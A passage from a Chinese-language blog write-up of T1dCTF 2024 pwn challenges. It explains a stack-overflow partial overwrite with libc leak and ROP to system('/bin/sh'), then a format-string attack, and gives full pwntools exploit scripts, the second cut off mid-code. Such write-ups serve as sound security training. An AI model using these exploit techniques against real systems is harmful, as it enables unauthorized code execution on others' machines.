<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>T1dCTF 2024 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2024 T1dCTF Pwn 题解"/><meta property="og:title" content="T1dCTF 2024 Writeup | 花盆"/><meta property="og:description" content="2024 T1dCTF Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/T1dCTF2024-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="t1dctf-2024-writeup" class="scroll-target"><a href="#t1dctf-2024-writeup"><code class="hash inline-code">#</code>T1dCTF 2024 Writeup</a></h1>
<p>补一下二队内测题。</p>
<h2 id="repeater" class="scroll-target"><a href="#repeater"><code class="hash inline-code">#</code>repeater</a></h2>
<blockquote>
<p>[easy] Repeater</p>
<p>As is well known, CTFers are all repeaters!</p>
</blockquote>
<p>栈溢出题目，<code class="inline-code">sub_11C9()</code> 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 <code class="inline-code">sub_11C9()</code> 读入 payload。</p>
<p>这里讲一下 <code class="inline-code">fread</code> 等 FILE 相关函数，后面也会用到。</p>
<p><a href title>C 语言 FILE 函数</a></p>
<p>既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。</p>
<p>接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 <code class="inline-code">call puts</code> 就可以泄漏了。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io = remote("tld1027.com", 9030)</span><br><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload1 </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">110</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">b</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\xb8</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">You say:</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">281</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">bbbbbbbb</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">main_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pie_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> main_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">12b8</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"pie_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">main_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">main_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload2 </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">110</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">cccccccc</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\xb3</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">You say:</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">281</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">cccccccc</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">fun_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> fun_addr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">funlockfile</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">system_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">system</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">binsh_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">101a</span><br><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"funlockfile_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">fun_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_base ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><br><span style="color:#AB5959">            f</span><span style="color:#B56959">"system_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">system_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><br><span style="color:#AB5959">            f</span><span style="color:#B56959">"binsh_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">binsh_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><br><span style="color:#AB5959">            f</span><span style="color:#B56959">"pop_rdi_ret ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><br><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload3 </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">110</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">dddddddd</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> system_addr</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">You say:</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"</span><span style="color:#1e754f">{</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">payload3</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h2 id="tag" class="scroll-target"><a href="#tag"><code class="hash inline-code">#</code>tag</a></h2>
<blockquote>
<p>[mid] tag</p>
<p>There is a fmt vulnerability, but it seems impossible to trigger.</p>
</blockquote>
<p>这题也不难，首先目标是把 v6 改成 1，可以发现在配对 tag 的时候，对于后标签只匹配了 <code class="inline-code">&lt;/</code>，导致可以 partial overwrite。</p>
<p>把 old_char 设置成 <code class="inline-code">\x00</code>，<code class="inline-code">new_char</code> 设置成 <code class="inline-code">\x01</code>，然后就可以打格式化字符串了。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Input ></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload1 </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">&#x3C;</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">>%11$p.%18$p.%29$p.bbbbbbbbb&#x3C;/</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"payload1 len ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">payload1</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload1</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># one</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Old tag to replace [q to quit] ></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">New tag ></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x01</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># two</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Old tag to replace [q to quit] ></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">New tag ></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">&#x3C;</span><span style="color:#B5695977">"</span><span style="color:#AB5959">+</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x01</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">IO_fw_addr</span><span style="color:#999999"> =</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">.</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 45</span><br><span style="color:#393A34">str_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">.</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">.</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span 